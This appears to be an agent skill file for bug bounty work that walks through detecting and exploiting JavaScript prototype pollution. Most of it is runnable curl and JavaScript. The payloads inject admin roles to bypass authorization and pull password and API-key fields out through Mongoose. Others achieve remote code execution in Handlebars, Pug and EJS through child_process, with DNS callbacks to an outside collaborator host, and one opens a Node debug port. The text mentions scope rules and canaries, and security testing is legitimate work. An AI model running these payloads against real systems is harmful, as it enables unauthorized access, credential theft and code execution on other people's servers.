---
name: prototype-pollution-hunter
description: Systematically detect and exploit prototype pollution vulnerabilities in JavaScript/Node.js targets — both client-side (DOM XSS via polluted properties, XSS gadgets in popular libraries) and server-side (Node.js object merge functions, lodash, hoek, deepmerge, AST injection leading to RCE). Trigger on phrases like "prototype pollution", "__proto__", "constructor.prototype", "lodash merge", "PP to RCE", or when recon reveals Node.js/Express targets, JSON merge/patch endpoints, query-string parsing with deep objects, or client-side URL parameter reflection into DOM sinks. Also trigger when JS recon reveals libraries with known PP gadgets (lodash <4.17.21, jQuery <3.4.0, Angular <1.7, async <2.6.4).
---

# Prototype Pollution Hunter Skill

Prototype pollution is a JavaScript-specific vulnerability where an attacker can inject properties into `Object.prototype`, affecting every object derived from it in the same process. Client-side PP leads to DOM XSS via pre-existing gadgets in popular libraries. Server-side PP in Node.js can escalate to Remote Code Execution through AST injection, template engine abuse, or `child_process` gadget chains — without ever touching the application's own code.

Run phases in order. Phase 1 determines whether the target is client-side, server-side, or both. All subsequent phases depend on that classification.

---

## Prerequisites

- Burp Collaborator or interactsh ready for blind OOB callbacks (server-side PP)
- Browser with DevTools (client-side PP testing)
- Node.js + npm available on Kali for payload crafting
- JS recon output from `js-analysis` workflow (`$TARGET_DIR/recon/js/`)

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/pp
```

---

## Phase 1 — Surface Classification and Library Fingerprinting

### Step 1.1 — Identify JavaScript Stack

```bash
# Check nuclei tech fingerprint for client-side frameworks
cat $TARGET_DIR/recon/nuclei/tech-summary.txt 2>/dev/null | \
  grep -iE 'jquery|angular|react|vue|backbone|underscore|lodash|prototype'

# Check JS bundles for library versions
grep -rih --include='*.txt' --include='*.js' \
  -E 'lodash[/@][0-9]|jquery[/@][0-9]|angular[/@][0-9]|async[/@][0-9]|hoek[/@][0-9]' \
  $TARGET_DIR/recon/js/ 2>/dev/null | sort -u

# Check npm package lock or package.json if source is exposed
curl -sk "https://$TARGET_DOMAIN/package.json" 2>/dev/null | python3 -m json.tool
curl -sk "https://$TARGET_DOMAIN/package-lock.json" 2>/dev/null | head -30
curl -sk "https://$TARGET_DOMAIN/.git/HEAD" 2>/dev/null && \
  echo "[!] .git exposed — fetch package.json from git objects"
```

### Step 1.2 — Identify Server-Side Node.js

```bash
# Server headers indicating Node.js / Express
curl -sk -I "https://$TARGET_DOMAIN/" | grep -iE 'x-powered-by|server|x-runtime'

# Express default headers
curl -sk -I "https://$TARGET_DOMAIN/" | grep -i 'x-powered-by: Express'

# Error page fingerprints
curl -sk "https://$TARGET_DOMAIN/NOTEXIST12345" | \
  grep -iE 'cannot get|express|node|at Object\.|TypeError|SyntaxError' | head -5

# Node.js version in stack traces (sometimes leaked)
curl -sk "https://$TARGET_DOMAIN/api/NOTEXIST" | \
  python3 -c "import sys,json
try:
    d=json.load(sys.stdin)
    print(d)
except: print(sys.stdin.read()[:200])" 2>/dev/null
```

### Step 1.3 — Known Vulnerable Library Versions

```bash
# Version ranges with confirmed PP gadgets:
cat << 'EOF'
Library Version Vulnerability
------- ------- -------------
lodash  <4.17.21  _.merge(), _.mergeWith(), _.defaultsDeep() — CVE-2019-10744
hoek    <4.2.1    hoek.merge() — CVE-2018-3721
async   <2.6.4    async.memoize() — CVE-2017-16024  
jQuery  <3.4.0    $.extend(true,...) deep merge — CVE-2019-11358
Angular <1.7.x    angular.merge() — CVE-2019-14863
ejs     <3.1.7    render options pollution — CVE-2022-29078
nunjucks <3.2.3   template options pollution
handlebars <4.7.7 PP to RCE via compiled template — CVE-2021-23369
pug     <3.0.1    PP to RCE via options — CVE-2021-21315
EOF

# Check discovered versions against this table
grep -rih --include='*.txt' 'lodash' $TARGET_DIR/recon/js/ 2>/dev/null | \
  grep -oP 'lodash[/@][0-9.]+' | sort -u
```

### Step 1.4 — Identify Merge/Assign/Clone Entry Points

```bash
# Server-side PP requires a merge/assign operation on user-supplied JSON
# Find endpoints that accept arbitrary JSON keys in the body

echo "[*] High-probability PP entry points:"
echo "  - POST endpoints accepting arbitrary JSON (profile update, settings, preferences)"
echo "  - PATCH endpoints using object-merge/assign for partial updates"
echo "  - Query-string parameters with bracket notation: ?user[role]=admin"
echo "  - JSON merge-patch (Content-Type: application/merge-patch+json)"
echo "  - URL parameters passed through qs.parse() with allowDots or allowPrototypes"

# Search endpoint inventory for PATCH and update-style endpoints
grep -iE '(PATCH|POST).*(update|settings|profile|preferences|config|merge|assign)' \
  $TARGET_DIR/recon/api/all-endpoints.txt 2>/dev/null | sort -u | head -20
```

---

## Phase 2 — Client-Side Prototype Pollution

### Step 2.1 — URL Parameter Pollution via `__proto__`

The most common client-side PP vector is query string parsing. Libraries like `qs`, `deparam`, and Angular's `$location` parse `__proto__` keys from URLs:

```bash
# Craft test URLs with PP payloads
BASE="https://$TARGET_DOMAIN/page"

PP_URLS=(
  "$BASE?__proto__[testkey]=testvalue"
  "$BASE?__proto__.testkey=testvalue"
  "$BASE?constructor[prototype][testkey]=testvalue"
  "$BASE?constructor.prototype.testkey=testvalue"
  "[__proto__][testkey]=testvalue"  # URL hash/fragment based
)

for URL in "${PP_URLS[@]}"; do
  echo "[*] Test in browser: $URL"
  echo "    Then in console: Object.prototype.testkey"
  echo "    Expected if vulnerable: 'testvalue'"
  echo "    Expected if not: undefined"
  echo ""
done
```

**Browser console detection steps:**

1. Open the target page with the PP payload URL
2. Open DevTools console
3. Run: `Object.prototype.testkey`
4. If returns `"testvalue"` → prototype pollution confirmed
5. Run: `({}).testkey` → same result confirms global `Object.prototype` is polluted

```javascript
// Paste in DevTools console to check PP status
(function checkPP() {
  const test = {};
  if (test.testkey === 'testvalue') {
    console.log('%c[POLLUTED] Object.prototype is polluted!', 'color:red;font-weight:bold');
    console.log('Polluted key:', 'testkey', '\nValue:', test.testkey);
    return true;
  }
  console.log('%c[CLEAN] Not polluted', 'color:green');
  return false;
})();
```

### Step 2.2 — JSON Body Pollution (API Endpoints)

```bash
# Test POST/PUT endpoints with __proto__ in JSON body
for ENDPOINT in $(grep -iE '^(POST|PUT|PATCH)' $TARGET_DIR/recon/api/all-endpoints.txt 2>/dev/null | head -20); do
  echo "[*] Testing: $ENDPOINT"
  curl -sk -X POST "$ENDPOINT" \
    -H 'Content-Type: application/json' \
    -H "Cookie: $SESSION_COOKIE" \
    -d '{"__proto__":{"pp_canary":"polluted_7x9q2"}}' \
    -w " [%{http_code}]\n" -o /dev/null
done

# Also test nested constructor prototype
curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"constructor":{"prototype":{"pp_canary":"polluted_7x9q2"}}}' \
  -w " [%{http_code}]\n" -o /tmp/pp_resp.json

# Check if the canary appears in any subsequent response
curl -sk "https://$TARGET_DOMAIN/api/profile" \
  -H "Cookie: $SESSION_COOKIE" | grep 'pp_canary'
```

### Step 2.3 — DOM XSS via Client-Side PP Gadgets

If `Object.prototype` is polluted, existing properties read by trusted library code become XSS sinks. Map gadgets for the detected libraries:

```bash
echo "=== CLIENT-SIDE PP GADGET MAP ==="
echo ""
echo "jQuery < 3.4.0 gadgets:"
echo "  Pollute: Object.prototype.url = 'javascript:alert(1)'"
echo "  Gadget:  \$.ajax({type:'GET'}) reads url from prototype if not set explicitly"
echo "  Trigger: Any \$.ajax() or \$.get() call without explicit url"
echo ""
echo "DOMPurify < 2.0.17 gadget (mXSS):"
echo "  Pollute: Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'"
echo ""
echo "Sanitize-HTML gadget:"
echo "  Pollute: Object.prototype.allowedTags = null"
echo "  Effect:  All HTML passes the sanitizer"
echo ""
echo "Lodash template gadget (lodash < 4.17.21):"
echo "  Pollute: Object.prototype.sourceURL = '\u2028//# sourceURL=alert(1)'"
echo "  Trigger: Any _.template() call"
echo ""
echo "Angular 1.x (ng-app):"
echo "  Pollute: Object.prototype.merge = [polluted function]"
echo "  Trigger: Various \$http / \$resource calls"
```

**Testing a gadget in-browser:**

```javascript
// Paste in DevTools after confirming PP is possible:
// Example: jQuery url gadget
Object.prototype.url = 'data:,PP-XSS-PoC-loaded';

// Trigger any $.ajax call on the page and check Network tab
// If the data: URL appears in a request — gadget confirmed
// For XSS PoC (replace with benign alert):
Object.prototype.url = 'javascript:alert(document.domain)';
```

### Step 2.4 — Automated Client-Side PP Scanning with PPScan

```bash
# PPScan — automated client-side PP detection via headless Chrome
# Install: npm install -g @nicolo-ribaudo/ppmap OR use ppmap directly
git clone https://github.com/kleiton0x00/ppmap ~/tools/ppmap 2>/dev/null

# Run ppmap against the target
if [ -d ~/tools/ppmap ]; then
  cd ~/tools/ppmap
  # Requires Node.js
  node index.js "https://$TARGET_DOMAIN/" 2>/dev/null | \
    tee $TARGET_DIR/recon/pp/ppmap-results.txt
  echo "[*] ppmap results: $TARGET_DIR/recon/pp/ppmap-results.txt"
else
  echo "[*] ppmap not installed — test manually via browser DevTools"
fi

# Alternative: use Burp extension 'J2EEScan' or manual Intruder with PP payloads
```

---

## Phase 3 — Server-Side Prototype Pollution (Node.js)

### Step 3.1 — Detect Server-Side PP via Status Code / Response Differences

Server-side PP detection is harder than client-side — there is no console to read. Use differential analysis:

```bash
# Technique 1: Pollute a property that affects JSON serialization
# If Object.prototype.toJSON is set, it will be called during JSON.stringify()
# This can cause response changes or errors

curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"__proto__":{"toJSON":"1"}}' \
  -w "\n[%{http_code}]" | tail -5

# If the response changes, errors, or server throws a 500 → PP is landing on the prototype

# Technique 2: Pollute a property used in response construction
# Many apps use res.json(someObj) — if Object.prototype has extra keys, they appear
curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"__proto__":{"canary_sspp":true}}' -o /dev/null

# Then check if canary appears in any serialized response
curl -sk "https://$TARGET_DOMAIN/api/profile" \
  -H "Cookie: $SESSION_COOKIE" | grep 'canary_sspp' && \
  echo "[CONFIRMED] canary_sspp present in response — server-side PP confirmed"
```

### Step 3.2 — Lodash `_.merge()` and `_.defaultsDeep()` Pollution

```bash
# Lodash < 4.17.21 — most common server-side PP vector
# Any endpoint that uses: _.merge(target, userInput) or _.defaultsDeep(target, userInput)

# Payload variants to test
cat << 'PAYLOADS'
{"__proto__":{"canary":"lodash_pp_test"}}
{"constructor":{"prototype":{"canary":"ctor_pp_test"}}}
{"__proto__":{"debug":true}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
PAYLOADS

# Test each against settings/profile update endpoints
for PAYLOAD in \
  '{"__proto__":{"pp_test":"lodash_merge"}}' \
  '{"constructor":{"prototype":{"pp_test":"ctor_path"}}}' ; do

  echo "[*] Payload: $PAYLOAD"
  curl -sk -X POST "https://$TARGET_DOMAIN/api/user/settings" \
    -H 'Content-Type: application/json' \
    -H "Cookie: $SESSION_COOKIE" \
    -d "$PAYLOAD" -w " [%{http_code}]\n" -o /tmp/pp_merge_resp.json

  # Check if canary appears in the response or in subsequent requests
  cat /tmp/pp_merge_resp.json | python3 -m json.tool 2>/dev/null | grep 'pp_test'
done
```

### Step 3.3 — Query String Parsing Pollution

Node.js `qs` library with `allowPrototypes: true` (default in older versions) parses `__proto__` from URL query strings:

```bash
# Test query-string based PP
for PAYLOAD_URL in \
  "https://$TARGET_DOMAIN/api/data?__proto__[pp_qs]=1" \
  "https://$TARGET_DOMAIN/api/data?__proto__.pp_qs=1" \
  "https://$TARGET_DOMAIN/api/data?constructor[prototype][pp_qs]=1" \
  "https://$TARGET_DOMAIN/api/data?[__proto__][pp_qs]=1"; do

  RESP=$(curl -sk "$PAYLOAD_URL" \
    -H "Cookie: $SESSION_COOKIE" -w "\n[%{http_code}]")
  CODE=$(echo "$RESP" | tail -1)
  echo "[$CODE] $PAYLOAD_URL"
  echo "$RESP" | grep -i 'pp_qs\|proto\|error\|TypeError' | head -3
done

# Check if the property persists to subsequent requests (cross-request pollution)
curl -sk "https://$TARGET_DOMAIN/api/profile" \
  -H "Cookie: $SESSION_COOKIE" | grep 'pp_qs' && \
  echo "[!] Canary persisted across requests — server-side PP confirmed"
```

### Step 3.4 — Blind Detection via Response Time / Error Induction

```bash
# Pollution of valueOf or toString causes errors in string/number operations
# Safe canary: pollute a rarely-used property and measure error rate change

# Before pollution — baseline
BEFORE=$(curl -sk "https://$TARGET_DOMAIN/api/profile" \
  -H "Cookie: $SESSION_COOKIE" -w "%{http_code}" -o /dev/null)
echo "Baseline status: $BEFORE"

# Send pollution payload
curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"__proto__":{"status":555}}' -o /dev/null

# After pollution — if Object.prototype.status=555 lands,
# express res.status() calls may reflect it
AFTER=$(curl -sk "https://$TARGET_DOMAIN/api/profile" \
  -H "Cookie: $SESSION_COOKIE" -w "%{http_code}" -o /dev/null)
echo "After pollution status: $AFTER"
[ "$AFTER" = "555" ] && echo "[CONFIRMED] HTTP status code polluted — server-side PP verified"

# Cleanup attempt (send null to reset)
curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"__proto__":{"status":null}}' -o /dev/null
```

---

## Phase 4 — Privilege Escalation via Prototype Pollution

### Step 4.1 — Authorization Property Injection

Once server-side PP is confirmed, escalate by injecting authorization-relevant properties:

```bash
# Common authorization gadgets — try each after confirming PP landing
AUTH_GADGETS=(
  '{"__proto__":{"isAdmin":true}}'
  '{"__proto__":{"admin":true}}'
  '{"__proto__":{"role":"admin"}}'
  '{"__proto__":{"roles":["admin","superuser"]}}'
  '{"__proto__":{"permissions":["*"]}}'
  '{"__proto__":{"authorized":true}}'
  '{"__proto__":{"verified":true}}'
  '{"__proto__":{"staff":true}}'
  '{"__proto__":{"superuser":true}}'
)

# Identify admin-only endpoints first
ADMIN_ENDPOINTS=(
  "https://$TARGET_DOMAIN/admin"
  "https://$TARGET_DOMAIN/api/admin"
  "https://$TARGET_DOMAIN/api/users"
  "https://$TARGET_DOMAIN/api/admin/users"
  "https://$TARGET_DOMAIN/dashboard/admin"
  "https://$TARGET_DOMAIN/api/settings/global"
)

# Baseline: confirm these return 401/403 without pollution
for EP in "${ADMIN_ENDPOINTS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$EP" -H "Cookie: $SESSION_COOKIE")
  echo "[Baseline:$CODE] $EP"
done

# Now inject each gadget and probe admin endpoints
for GADGET in "${AUTH_GADGETS[@]}"; do
  # Inject
  curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
    -H 'Content-Type: application/json' \
    -H "Cookie: $SESSION_COOKIE" \
    -d "$GADGET" -o /dev/null

  # Test access
  for EP in "${ADMIN_ENDPOINTS[@]}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$EP" -H "Cookie: $SESSION_COOKIE")
    [ "$CODE" = "200" ] && \
      echo "[PRIVESC-CONFIRMED] Gadget: $GADGET | Endpoint: $EP | Code: $CODE" | \
      tee -a $TARGET_DIR/recon/pp/confirmed-privesc.txt
  done
done
```

### Step 4.2 — Property Injection via PATCH Merge

```bash
# PATCH endpoints using JSON Merge Patch (RFC 7396) often call Object.assign() internally
# This bypasses __proto__ if the parser handles it, but some implementations don't

curl -sk -X PATCH "https://$TARGET_DOMAIN/api/user/me" \
  -H 'Content-Type: application/merge-patch+json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"__proto__":{"role":"admin"}}' -w "\n[%{http_code}]"

# Also test JSON Patch (RFC 6902) — op:add with path /__proto__/role
curl -sk -X PATCH "https://$TARGET_DOMAIN/api/user/me" \
  -H 'Content-Type: application/json-patch+json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d '[{"op":"add","path":"/__proto__/role","value":"admin"}]' -w "\n[%{http_code}]"
```

---

## Phase 5 — PP to RCE via Template Engine and AST Injection

**Only attempt after server-side PP is confirmed. Coordinate with scope rules.**

### Step 5.1 — Handlebars PP to RCE (CVE-2021-23369)

```bash
# Handlebars < 4.7.7 compiles templates using Function() constructor
# Polluting the right prototype properties executes arbitrary JavaScript server-side

# Safe canary payload — DNS callback only, no shell
HBS_CANARY_PAYLOAD=$(cat << 'PAYLOAD'
{
  "__proto__": {
    "__defineGetter__": "__defineGetter__"
  },
  "main": "{{this.constructor.constructor('return process.mainModule.require(\'child_process\').execSync(\'nslookup COLLAB_URL\')')(this)}}"
}
PAYLOAD
)

# Replace COLLAB_URL with your Burp Collaborator subdomain
HBS_PAYLOAD=$(echo "$HBS_CANARY_PAYLOAD" | sed "s/COLLAB_URL/$COLLAB_URL/g")

curl -sk -X POST "https://$TARGET_DOMAIN/api/render" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d "$HBS_PAYLOAD" -w "\n[%{http_code}]" | tail -3

echo "[*] Monitor Collaborator for DNS callback from $COLLAB_URL"
```

### Step 5.2 — Pug/Jade PP to RCE (CVE-2021-21315)

```bash
# Pug template engine pollutes options passed to Function() during compile
# Payload injects code via polluted 'self' or 'globals' option

PUG_RCE_PAYLOAD=$(python3 -c "
import json
payload = {
    '__proto__': {
        'block': {
            'type': 'Text',
            'line': 'process.mainModule.require(\"child_process\").execSync(\"nslookup $COLLAB_URL\")'
        }
    }
}
print(json.dumps(payload))
")

curl -sk -X POST "https://$TARGET_DOMAIN/api/template" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d "$PUG_RCE_PAYLOAD" -w "\n[%{http_code}]" | tail -3

echo "[*] Monitor Collaborator for DNS callback"
```

### Step 5.3 — EJS PP to RCE (CVE-2022-29078)

```bash
# EJS (Embedded JavaScript Templates) < 3.1.7
# Polluting outputFunctionName executes arbitrary code during render

EJS_PAYLOAD=$(python3 -c "
import json
payload = {
    '__proto__': {
        'outputFunctionName': \"x;process.mainModule.require('child_process').execSync('nslookup $COLLAB_URL');x\"
    }
}
print(json.dumps(payload))
")

curl -sk -X POST "https://$TARGET_DOMAIN/api/render" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d "$EJS_PAYLOAD" -w "\n[%{http_code}]" | tail -3

echo "[*] DNS callback from Collaborator = EJS PP to RCE confirmed"
```

### Step 5.4 — Generic Node.js PP to RCE via `child_process`

```bash
# If the application uses spawn() or exec() with options derived from objects,
# polluting shell or env can redirect execution

# shell gadget — works when child_process.spawn() inherits options from prototype
SHELL_PAYLOAD=$(python3 -c "
import json
payload = {
    '__proto__': {
        'shell': 'node',
        'NODE_OPTIONS': '--require /proc/self/cmdline',  # DoS / info only
        'env': {'NODE_OPTIONS': '--inspect=0.0.0.0:9229'}  # enables debug port
    }
}
print(json.dumps(payload))
")

echo "[*] shell/env pollution targets spawn() calls with user-controlled options"
echo "[*] Full RCE chain: pollute shell + deliver code via file write or env"
echo "[*] Reference: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution"
```

### Step 5.5 — Express + Mongoose Permission Bypass

```bash
# Mongoose query objects can be polluted to bypass field-level access restrictions
# If Object.prototype has extra fields, Mongoose find() may include them in projections

# Example: pollute 'select' to force password field return
MONGO_PAYLOAD=$(python3 -c "
import json
payload = {
    '__proto__': {
        'select': '+password +apiKey +secret',
        'returnDocument': 'after'
    }
}
print(json.dumps(payload))
")

curl -sk -X POST "https://$TARGET_DOMAIN/api/settings" \
  -H 'Content-Type: application/json' \
  -H "Cookie: $SESSION_COOKIE" \
  -d "$MONGO_PAYLOAD" -o /dev/null

# Then fetch profile and check if sensitive fields appear
curl -sk "https://$TARGET_DOMAIN/api/profile" \
  -H "Cookie: $SESSION_COOKIE" | python3 -m json.tool 2>/dev/null | \
  grep -iE 'password|apikey|secret|token|hash' && \
  echo "[!] Sensitive field exposed via Mongoose projection pollution"
```

---

## Phase 6 — Automation with ppmap and server-side tools

### Step 6.1 — ppmap for Automated Client-Side Gadget Discovery

```bash
# ppmap tests hundreds of gadgets automatically via headless Chrome
# https://github.com/kleiton0x00/ppmap

if command -v node &>/dev/null && [ -f ~/tools/ppmap/index.js ]; then
  echo "[*] Running ppmap against $TARGET_DOMAIN..."
  echo "https://$TARGET_DOMAIN" | node ~/tools/ppmap/index.js \
    2>/dev/null | tee $TARGET_DIR/recon/pp/ppmap-output.txt
  
  GADGETS=$(grep -c 'FOUND' $TARGET_DIR/recon/pp/ppmap-output.txt 2>/dev/null || echo 0)
  echo "[*] Gadgets found: $GADGETS"
  grep 'FOUND' $TARGET_DIR/recon/pp/ppmap-output.txt 2>/dev/null
else
  echo "[*] Install ppmap: git clone https://github.com/kleiton0x00/ppmap ~/tools/ppmap"
fi
```

### Step 6.2 — server-side-prototype-pollution npm package (White-Box Testing)

```bash
# If you have Node.js source access (from .git leak, open-source target, etc.)
# Install and run the @nicolo-ribaudo/server-side-prototype-pollution scanner
# https://www.npmjs.com/package/@nicolo-ribaudo/ppmap

cd /tmp && npm install @nicolo-ribaudo/ppmap 2>/dev/null
echo "[*] For white-box: require('@nicolo-ribaudo/ppmap').scan() in the app context"
```

### Step 6.3 — Nuclei PP Templates

```bash
# Run nuclei prototype pollution templates against the target
nuclei \
  -l $TARGET_DIR/recon/live-hosts.txt \
  -t vulnerabilities/generic/prototype-pollution.yaml \
  -t vulnerabilities/nodejs/ \
  -severity medium,high,critical \
  -c 10 \
  -timeout 10 \
  -silent \
  -json \
  -o $TARGET_DIR/recon/pp/nuclei-pp.json 2>/dev/null

NUCLEI_HITS=$(wc -l < $TARGET_DIR/recon/pp/nuclei-pp.json 2>/dev/null || echo 0)
echo "[*] Nuclei PP hits: $NUCLEI_HITS"
[ "$NUCLEI_HITS" -gt 0 ] && cat $TARGET_DIR/recon/pp/nuclei-pp.json | \
  python3 -c "import sys,json; [print(json.loads(l).get('info',{}).get('name','?'), '@', json.loads(l).get('matched-at','?')) for l in sys.stdin if l.strip()]"
```

---

## Phase 7 — Validation and PoC Documentation

### Step 7.1 — Validation Standard

```bash
echo "=== VALIDATION REQUIREMENTS ==="
echo ""
echo "Client-side PP (DOM XSS):"
echo "  1. Confirm Object.prototype is polluted via DevTools console"
echo "  2. Confirm a library gadget reads the polluted property"
echo "  3. Demonstrate XSS payload execution (alert(document.domain))"
echo "  4. Screenshot DevTools console + XSS execution"
echo ""
echo "Server-side PP (auth bypass):"
echo "  1. Confirm PP landing: canary property visible in subsequent response"
echo "  2. Confirm privilege escalation: 200 on admin endpoint that was 403 before"
echo "  3. Show the exact property that bypasses auth (isAdmin, role, etc.)"
echo "  4. HTTP request/response pair for both steps"
echo ""
echo "Server-side PP (RCE):"
echo "  1. DNS callback in Collaborator confirming code execution"
echo "  2. Hostname exfiltration via DNS for undeniable PoC"
echo "  3. Do NOT spawn a shell on production targets"
echo "  4. Template engine name + version in report"
```

### Step 7.2 — Save Artifacts

```bash
cat > $TARGET_DIR/recon/pp/pp-summary.txt << EOF
# Prototype Pollution Findings
# Target: $TARGET_DOMAIN
# Date: $(date)

## Client-Side PP Confirmed
# Vector: [URL param / JSON body / fragment]
# Gadget: [library + property]
# Impact: [XSS / property injection]

## Server-Side PP Confirmed
# Vector: [endpoint + field]
# Library: [lodash / merge / qs etc.]
# Impact: [auth bypass / RCE]

## Evidence Files
# ppmap-output.txt, nuclei-pp.json, confirmed-privesc.txt
EOF

ls -la $TARGET_DIR/recon/pp/
```

---

## Severity Reference

| Finding | Severity |
|---|---|
| Server-side PP → RCE via Handlebars/Pug/EJS gadget (confirmed DNS) | Critical |
| Server-side PP → privilege escalation to admin confirmed (200 on restricted endpoint) | High–Critical |
| Server-side PP → Mongoose/DB field exposure (password, apiKey in response) | High |
| Client-side PP → XSS via library gadget (alert(document.domain) confirmed) | High |
| Server-side PP landing confirmed (canary in response), no gadget found yet | Medium |
| Client-side PP confirmed (Object.prototype polluted) but no XSS gadget found | Medium |
| Client-side PP on non-sensitive pages (no gadget, no impact chain) | Low |
| PP vector present but blocked by prototype freeze or null-prototype objects | Informational |

---

## Guiding Principles

- **Confirm PP landing before claiming any gadget.** A canary in a subsequent API response or a polluted `Object.prototype` in the browser console is the baseline evidence. Without this confirmation, any payload sent is noise.
- **Server-side PP is persistent across requests on Node.js.** Unlike client-side, a server-side pollution affects every request processed by the same Node.js worker until it restarts. Be conservative: inject canaries, not blind auth gadgets on the first try. A canary is `{"pp_test_7q9":"1"}` — not `{"isAdmin":true}`.
- **RCE gadgets require the right template engine in the stack.** Handlebars, Pug, and EJS gadgets are only exploitable if that specific library is present and called with a render flow the pollution reaches. Confirm the library via tech fingerprinting before sending an RCE payload.
- **Prioritize auth bypass over RCE for PoC.** An auth bypass PoC is clean, undeniable, and produces no side effects on production. A DNS-callback-based RCE PoC is also acceptable. A reverse shell on production is never acceptable.
- **`__proto__` and `constructor.prototype` are not equivalent on all parsers.** Some JSON parsers strip `__proto__` but pass `constructor.prototype`. Test both. Some query-string parsers handle `[__proto__]` as a bracket key, not a prototype. Test URL-encoded bracket notation separately.
- **Null-prototype objects block pollution.** `Object.create(null)` produces an object with no prototype. Many modern Node.js apps use these for query result objects. If your canary never lands, the target may be using null-prototype objects — this is not a failure, it is a defence that should be noted.
- **Run /triager before submitting.** Client-side PP without a working gadget chain is Medium at most on most programs. Server-side PP to RCE with a DNS callback is Critical, but ensure the DNS interaction timestamp and your request timestamp are aligned in the evidence — triagers will scrutinize this.
